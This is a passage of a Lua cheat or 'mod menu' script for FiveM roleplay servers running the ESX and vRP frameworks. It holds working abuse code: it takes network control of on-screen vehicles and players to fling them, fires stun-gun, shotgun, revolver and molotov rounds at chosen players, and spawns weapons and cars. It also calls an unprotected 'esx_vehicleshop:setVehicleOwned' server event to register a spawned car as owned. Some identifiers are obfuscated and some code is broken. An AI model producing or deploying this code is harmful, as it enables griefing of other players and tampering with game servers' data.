    {"Light Gray", 14},
    {"Ice White", 131},
    {"Blue", 83},
    {"Dark Blue", 82},
    {"Midnight Blue", 84},
    {"Midnight Purple", 149},
    {"Schafter Purple", 148},
    {"Red", 39},
    {"Dark Red", 40},
    {"Orange", 41},
    {"Yellow", 42},
    {"Lime Green", 55},
    {"Green", 128},
    {"Forest Green", 151},
    {"Foliage Green", 155},
    {"Olive Darb", 152},
    {"Dark Earth", 153},
    {"Desert Tan", 154}
}

local metalColors = {
    {"Brushed Steel", 117},
    {"Brushed Black Steel", 118},
    {"Brushed Aluminum", 119},
    {"Chrome", 120},
    {"Pure Gold", 158},
    {"Brushed Gold", 159}
}


local Keys = {
    ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
    ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
    ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
    ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
    ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
    ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
    ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
    ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
    ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118,
    ["MOUSE1"] = 24
}

-- Get ESX shared object
ESX = nil
Citizen.CreateThread(function()
    while ESX == nil do
        TriggerEvent("esx:getSharedObject", function(c)ESX = c end)
        Citizen.Wait(1000)
    end
end)


vRP = Proxy.getInterface("vRP")








local function ForceMod()
    ForceTog = not ForceTog
    
    if ForceTog then
        
        Citizen.CreateThread(function()
            ShowInfo("Force ~g~ENABLED ~r~\nPress E to use")
            
            local ForceKey = Keys["E"]
            local Force = 0.5
            local KeyPressed = false
            local KeyTimer = 0
            local KeyDelay = 15
            local ForceEnabled = false
            local StartPush = false
            
            function forcetick()
                
                if (KeyPressed) then
                    KeyTimer = KeyTimer + 1
                    if (KeyTimer >= KeyDelay) then
                        KeyTimer = 0
                        KeyPressed = false
                    end
                end
                
                
                
                if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
                    KeyPressed = true
                    ForceEnabled = true
                end
                
                if (StartPush) then
                    
                    StartPush = false
                    local pid = PlayerPedId()
                    local CamRot = GetGameplayCamRot(2)
                    
                    local force = 5
                    
                    local Fx = -(math.sin(math.rad(CamRot.z)) * force * 10)
                    local Fy = (math.cos(math.rad(CamRot.z)) * force * 10)
                    local Fz = force * (CamRot.x * 0.2)
                    
                    local PlayerVeh = GetVehiclePedIsIn(pid, false)
                    
                    for k in EnumerateVehicles() do
                        SetEntityInvincible(k, false)
                        if IsEntityOnScreen(k) and k ~= PlayerVeh then
                            ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
                        end
                    end
                    
                    for k in EnumeratePeds() do
                        if IsEntityOnScreen(k) and k ~= pid then
                            ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
                        end
                    end
                
                end
                
                
                if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
                    KeyPressed = true
                    StartPush = true
                    ForceEnabled = false
                end
                
                if (ForceEnabled) then
                    local pid = PlayerPedId()
                    local PlayerVeh = GetVehiclePedIsIn(pid, false)
                    
                    Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
                    
                    DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 180, 0, 0, 35, false, true, 2, nil, nil, false)
                    
                    for k in EnumerateVehicles() do
                        SetEntityInvincible(k, true)
                        if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
                            RequestControlOnce(k)
                            FreezeEntityPosition(k, false)
                            Oscillate(k, Markerloc, 0.5, 0.3)
                        end
                    end
                    
                    for k in EnumeratePeds() do
                        if IsEntityOnScreen(k) and k ~= PlayerPedId() then
                            RequestControlOnce(k)
                            SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
                            FreezeEntityPosition(k, false)
                            Oscillate(k, Markerloc, 0.5, 0.3)
                        end
                    end
                
                end
            
            end
            
            while ForceTog do forcetick()Wait(0) end
        end)
    else ShowInfo("Force ~r~Disabled") end

end



function GetSeatPedIsIn(ped)
    if not IsPedInAnyVehicle(ped, false) then return
    else
        veh = GetVehiclePedIsIn(ped)
        for i = 0, GetVehicleMaxNumberOfPassengers(veh) do
            if GetPedInVehicleSeat(veh) then return i end
        end
    end
end

local function ClonePedVeh()
    local ped = GetPlayerPed(SelectedPlayer)
    local pedVeh = nil
    local PlayerPed = PlayerPedId()
    if IsPedInAnyVehicle(ped, false) then
        pedVeh = GetVehiclePedIsIn(ped, false)
    else
        pedVeh = GetVehiclePedIsIn(ped, true)
        if DoesEntityExist(pedVeh) then
            local vmh = GetEntityModel(pedVeh)
            local playerpos = GetEntityCoords(PlayerPed, false)
            local playerveh =
                CreateVehicle(vmh, playerpos.x, playerpos.y, playerpos.z, GetEntityHeading(PlayerPed), true, true)
            SetPedIntoVehicle(PlayerPed, playerveh, -1)
            local pcolor, scolor = nil
            GetVehicleColours(pedVeh, pcolor, scolor)
            SetVehicleColours(playerveh, pcolor, scolor)
            if IsThisModelACar(vmh) or IsThisModelABike(vhm) then
                SetVehicleModKit(playerveh, 0)
                SetVehicleWheelType(playerveh, GetVehicleWheelType(pedVeh))
                local pc, wc = nil
                SetVehicleNumberPlateTextIndex(playerveh, GetVehicleNumberPlateTextIndex(pedVeh))
                SetVehicleNumberPlateText(playerveh, GetVehicleNumberPlateText(pedVeh))
                GetVehicleExtraColours(pedVeh, pc, wc)
                SetVehicleExtraColours(playerveh, pc, wc)
            end
        end
    end
end

function GetCamDirFromScreenCenter()
    local pos = GetGameplayCamCoord()
    local world = ScreenToWorld(0, 0)
    local ret = SubVectors(world, pos)
    return ret
end



if RainbowVeh then
    local u48y34 = k(1.0)
    SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
    SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
end

if ou328hSync then
    local u48y34 = k(1.0)
    local ped = PlayerPedId()
    local veh = GetVehiclePedIsUsing(ped)
    SetVehicleNeonLightEnabled(veh, 0, true)
    SetVehicleNeonLightEnabled(veh, 0, true)
    SetVehicleNeonLightEnabled(veh, 1, true)
    SetVehicleNeonLightEnabled(veh, 2, true)
    SetVehicleNeonLightEnabled(veh, 3, true)
    SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
    SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
    SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
end


if ou328hNeon then
    local u48y34 = k(1.0)
local ped = PlayerPedId()
local veh = GetVehiclePedIsUsing(ped)
    SetVehicleNeonLightEnabled(veh, 0, true)
    SetVehicleNeonLightEnabled(veh, 0, true)
    SetVehicleNeonLightEnabled(veh, 1, true)
    SetVehicleNeonLightEnabled(veh, 2, true)
    SetVehicleNeonLightEnabled(veh, 3, true)
    SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
end



function ScreenToWorld(screenCoord)
    local camRot = GetGameplayCamRot(2)
    local camPos = GetGameplayCamCoord()
    
    local vect2x = 0.0
    local vect2y = 0.0
    local vect21y = 0.0
    local vect21x = 0.0
    local direction = RotationToDirection(camRot)
    local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)
    
    local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32)
    local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31)
    local radians = -(math.rad(camRot.y))
    
    vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
    vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))
    
    local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34)
    if not case1 then
        vect2x = x1
        vect2y = y1
        return camPos + (direction * 10.0)
    end
    
    local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0))
    if not case2 then
        vect21x = x2
        vect21y = y2
        return camPos + (direction * 10.0)
    end
    
    if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
        return camPos + (direction * 10.0)
    end
    
    local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
    local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
    return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)

end

function WorldToScreenRel(worldCoords)
    local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
    if not check then
        return false
    end
    
    screenCoordsx = (x - 0.5) * 2.0
    screenCoordsy = (y - 0.5) * 2.0
    return true, screenCoordsx, screenCoordsy
end

function RotationToDirection(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

local function GetCamDirection()
    local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
    local pitch = GetGameplayCamRelativePitch()
    
    local x = -math.sin(heading * math.pi / 180.0)
    local y = math.cos(heading * math.pi / 180.0)
    local z = math.sin(pitch * math.pi / 180.0)
    
    local len = math.sqrt(x * x + y * y + z * z)
    if len ~= 0 then
        x = x / len
        y = y / len
        z = z / len
    end
    
    return x, y, z
end



-- functions
function notify(string)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(string)
    DrawNotification(true, false)
end

--car
RegisterCommand('car', function(source, args, rawCommand)
    local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 8.0, 0.5))
    local veh = args[1]
    if veh == nil then veh = "adder" end
    vehiclehash = GetHashKey(veh)
    RequestModel(vehiclehash)
    
    Citizen.CreateThread(function() 
        local waiting = 0
        while not HasModelLoaded(vehiclehash) do
            waiting = waiting + 100
            Citizen.Wait(100)
            if waiting > 5000 then
                ShowNotification("~r~Could not load the vehicle model in time, a crash was prevented.")
                break
            end
        end
        CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId())+90, 1, 0)
    end)
end)

--gun
RegisterCommand("gun", function(source, args, rawCommand) -- /gun pistol (Add weapon!)
    GiveWeaponToPed(PlayerPedId(), "weapon_"..args[1], 250, false, true)
    notify("~r~[Server]: ~b~You have been given a ~g~'"..rawCommand.."~g~'.")
end)

--revive
RegisterCommand("r", function()
    notify("~g~Revived yourself.")
    SetEntityHealth(PlayerPedId(), 200)
    TriggerEvent("TRP:FIXCLIENT")
end)





-- heal and armour
RegisterCommand('h', function()
    notify("~g~Healed")
    SetEntityHealth(GetPlayerPed(-1), 200)
end)

RegisterCommand('a', function()
    notify("~b~100% armour applied")
    AddArmourToPed(GetPlayerPed(-1), 98)
end)



-- FIX COMMAND
RegisterNetEvent('faded:fix')
AddEventHandler('faded:fix', function()
	local playerPed = GetPlayerPed(-1)
	if IsPedInAnyVehicle(playerPed, false) then
		local vehicle = GetVehiclePedIsIn(playerPed, false)
		SetVehicleEngineHealth(vehicle, 1000)
		SetVehicleEngineOn( vehicle, true, true )
		SetVehicleFixed(vehicle)
		notify("~g~Your vehicle has been fixed!")
	else
		notify("~o~You're not in a vehicle! There is no vehicle to fix!")
	end
end)

RegisterCommand("fix", function(source, n, msg) -- /fix til at fixe
	local playerPed = GetPlayerPed(-1)
	if IsPedInAnyVehicle(playerPed, false) then
		local vehicle = GetVehiclePedIsIn(playerPed, false)
		SetVehicleEngineHealth(vehicle, 1000)
		SetVehicleEngineOn( vehicle, true, true )
		SetVehicleFixed(vehicle)
		notify("~g~Your vehicle has been fixed!")
	else
		notify("~o~You're not in a vehicle! There is no vehicle to fix!")
	end
end)

local function teleportToWaypoint()
	local targetPed = GetPlayerPed(-1)
	local targetVeh = GetVehiclePedIsUsing(targetPed)
	if(IsPedInAnyVehicle(targetPed))then
		targetPed = targetVeh
    end

	if(not IsWaypointActive())then
		return
	end

	local waypointBlip = GetFirstBlipInfoId(8) -- 8 = waypoint Id
	local x,y,z = table.unpack(Citizen.InvokeNative(0xFA7C7F0AADF25D09, waypointBlip, Citizen.ResultAsVector())) 

	-- ensure entity teleports above the ground
	local ground
	local groundFound = false
	local groundCheckHeights = {100.0, 150.0, 50.0, 0.0, 200.0, 250.0, 300.0, 350.0, 400.0,450.0, 500.0, 550.0, 600.0, 650.0, 700.0, 750.0, 800.0}

	for i,height in ipairs(groundCheckHeights) do
		SetEntityCoordsNoOffset(targetPed, x,y,height, 0, 0, 1)
		Wait(10)

		ground,z = GetGroundZFor_3dCoord(x,y,height)
		if(ground) then
			z = z + 3
			groundFound = true
			break;
		end
	end

	if(not groundFound)then
		z = 1000
		GiveDelayedWeaponToPed(PlayerPedId(), 0xFBAB5776, 1, 0) -- parachute
	end

	SetEntityCoordsNoOffset(targetPed, x,y,z, 0, 0, 1)
end

RegisterCommand("tpm", function(source)
    teleportToWaypoint()
end)

RegisterCommand("suicide", function()
    local player = GetPlayerPed(-1)

    RequestAnimDict('mp_suicide')
    while not HasAnimDictLoaded('mp_suicide') do Wait(0) end

    TaskPlayAnim(player, 'mp_suicide', 'pill', 8.0, 1.0, 5000, 0, 1, true, true, true)
    Wait(4600)
    SetEntityHealth(player, 0)
    Wait(4500)
    notify("~r~You have killed yourself, use /r to revive yourself.")
end)

RegisterCommand("tp", function(source, args, raw)
	local name = table.concat(args)
	local player = FindPlayerWithName(name)
	if player ~= nil then
		TeleportToPlayer(player)
	end
end, false)

function TeleportToPlayer(player)
	local lPed = GetPlayerPed(PlayerId())
	local oPed = GetPlayerPed(player)
	local oPedPos = GetEntityCoords(oPed, false)
	SetEntityCoords(lPed, oPedPos.x, oPedPos.y, oPedPos.z + 1.0, 0.0, 0.0, 0.0, false)
end

function FindPlayerWithName(string)
	for a = 0, 64 do
		if GetPlayerName(a) == string then
			return a
		end
	end
	return nil
end



local function fv()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    local cw = KeyboardInput('Enter Vehicle Licence Plate', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        RequestModel(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        SetVehicleNumberPlateText(veh, cw)
        local cx = ESX.Game.GetVehicleProperties(veh)
        TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
        av('~g~~h~Success', false)
    else
        av('~b~~h~Model is not valid!', true)
    end
end




function ApplyForce(entity, direction)
    ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
end

function RequestControlOnce(entity)
    if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end

function RequestControl(entity)
    Citizen.CreateThread(function()
        local tick = 0
        while not RequestControlOnce(entity) and tick <= 12 do
            tick = tick + 1
            Wait(0)
        end
        return tick <= 12
    end)
end

function Oscillate(entity, position, angleFreq, dampRatio)
    local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
    local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
    local targetPos = SubVectors(pos1, pos2)
    
    ApplyForce(entity, targetPos)
end


function ShowMPMessage(message, subtitle, ms)
    Citizen.CreateThread(function()
        Citizen.Wait(0)
        function Initialize(scaleform)
            local scaleform = RequestScaleformMovie(scaleform)
            while not HasScaleformMovieLoaded(scaleform) do
                Citizen.Wait(0)
            end
            PushScaleformMovieFunction(scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
            PushScaleformMovieFunctionParameterString(message)
            PushScaleformMovieFunctionParameterString(subtitle)
            PopScaleformMovieFunctionVoid()
            Citizen.SetTimeout(6500, function()
                PushScaleformMovieFunction(scaleform, "SHARD_ANIM_OUT")
                PushScaleformMovieFunctionParameterInt(1)
                PushScaleformMovieFunctionParameterFloat(0.33)
                PopScaleformMovieFunctionVoid()
                Citizen.SetTimeout(3000, function()EndScaleformMovieMethod() end)
            end)
            return scaleform
        end
        
        scaleform = Initialize("mp_big_message_freemode")
        
        while true do
            Citizen.Wait(0)
            DrawScaleformMovieFullscreen(scaleform, 255, 255, 255, 150, 0)
        end
    end)
end

function ShowInfo(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(true, false)
end

function DrawTxt(text, x, y, scale, size)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(scale, size)
    SetTextDropshadow(1, 0, 0, 0, 255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(x, y)
end

function DrawText3D(x, y, z, text)
    local onScreen, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)
    local px, py, pz = table.unpack(GetGameplayCamCoords())
    local dist = GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)
    
    local scale = (1 / dist) * 2
    local fov = (1 / GetGameplayCamFov()) * 100
    local scale = scale * fov
    
    if onScreen then
        SetTextScale(0.0 * scale, 0.55 * scale)
        SetTextFont(0)
        SetTextProportional(1)
        SetTextColour(255, 255, 255, 255)
        SetTextDropshadow(0, 0, 0, 0, 255)
        SetTextEdge(2, 0, 0, 0, 150)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end


local entityEnumerator = {
    __gc = function(enum)
        if enum.destructor and enum.handle then
            enum.destructor(enum.handle)
        end
        enum.destructor = nil
        enum.handle = nil
    end
}

local function GetHeadItems()
    local headItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 0)
    local faceItemsList = {}
    for i = 1, headItems do
        faceItemsList[i] = i
    end
	return faceItemsList
end

local function RwFbMFt4el(player)
    local ped = GetPlayerPed(player)
    local tLoc = GetEntityCoords(ped)

    local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
    local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)



    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
end


local function TazePlayer15x(player)
    local ped = GetPlayerPed(player)
    local tLoc = GetEntityCoords(ped)

    local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
    local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)



    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
    ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
end




local function ShootPlayer(player)
    local ped = GetPlayerPed(player)
    local tLoc = GetEntityCoords(ped)

    local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
    local origin = GetPedBoneCoords(ped, 2.0, 0.0, 0.0, 2.0)


    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_PUMPSHOTGUN`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_REVOLVER_MK2`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_PUMPSHOTGUN`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_REVOLVER_MK2`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_PUMPSHOTGUN`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_REVOLVER_MK2`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_PUMPSHOTGUN`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_REVOLVER_MK2`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_PUMPSHOTGUN`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_REVOLVER_MK2`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_PUMPSHOTGUN`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_REVOLVER_MK2`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_PUMPSHOTGUN`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_REVOLVER_MK2`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_PUMPSHOTGUN`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_REVOLVER_MK2`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_PUMPSHOTGUN`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_REVOLVER_MK2`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_PUMPSHOTGUN`, PlayerPedId(), true, false, 999.0)
end



local function ShootPlayer2(player)
    local ped = GetPlayerPed(player)
    local tLoc = GetEntityCoords(ped)

    local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
    local origin = GetPedBoneCoords(ped, 2.0, 0.0, 0.0, 2.0)


    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
    ShootSingleBulletBetweenCoordsIgnoreEntity(origin, destination, 999, true, `WEAPON_MOLOTOV`, PlayerPedId(), true, false, 999.0)
end

local function GetHeadTextures(faceID)
    local headTextures = GetNumberOfPedTextureVariations(PlayerPedId(), 0, faceID)
	local headTexturesList = {}
    for i = 1, headTextures do
        headTexturesList[i] = i
    end
	return headTexturesList
end

local function GetHairItems()
    local hairItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 2)
    local hairItemsList = {}
    for i = 1, hairItems do
        hairItemsList[i] = i
    end
    return hairItemsList
end

local function GetHairTextures(hairID)
    local hairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, hairID)
    local hairTextureList = {}
    for i = 1, hairTexture do
        hairTextureList[i] = i
    end
    return hairTextureList
end

local function GetMaskItems()
    local maskItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 1)
    local maskItemsList = {}
    for i = 1, maskItems do
        maskItemsList[i] = i
    end
	return maskItemsList
end

local function GetHatItems()
    local hatItems = GetNumberOfPedPropDrawableVariations(PlayerPedId(), 0)
    local hatItemsList = {}
    for i = 1, hatItems do
        hatItemsList[i] = i
    end
	return hatItemsList
end

local function GetHatTextures(hatID)
	local hatTextures = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, hatID)
	local hatTexturesList = {}
	for i = 1, hatTextures do
        hatTexturesList[i] = i
    end
	return hatTexturesList
end

local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
    return coroutine.wrap(function()
        local iter, id = initFunc()
